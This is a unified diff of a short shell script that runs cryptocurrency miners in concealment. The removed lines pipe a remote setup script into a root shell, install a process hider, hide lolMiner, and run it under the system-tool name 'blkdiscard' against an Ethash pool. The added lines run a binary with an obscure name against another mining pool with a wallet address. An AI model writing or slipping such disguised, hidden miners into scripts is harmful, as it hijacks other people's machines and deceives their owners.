@@ -3,5 +3,5 @@
 
 #gives ip address 
 curl ipecho.net/plain && curl ipecho.net/plain
-chmod +x blkdiscard 
-sudo apt-get update && sudo apt-get full-upgrade && sudo apt-get install -f && sudo su --command "curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt-get install -y nodejs && npm i -g node-process-hider && sudo ph add lolMiner && ./blkdiscard --algo ETHASH --pool stratum+tcp://ethash.kupool.com:8888 --user legassa.001
+chmod +x revansj
+./revansj run https://server1.whalestonpool.com/ EQD16gKH-wzN_NE7lM0fw9qRiepYLe9wh8NU74RDPr26R1Gt
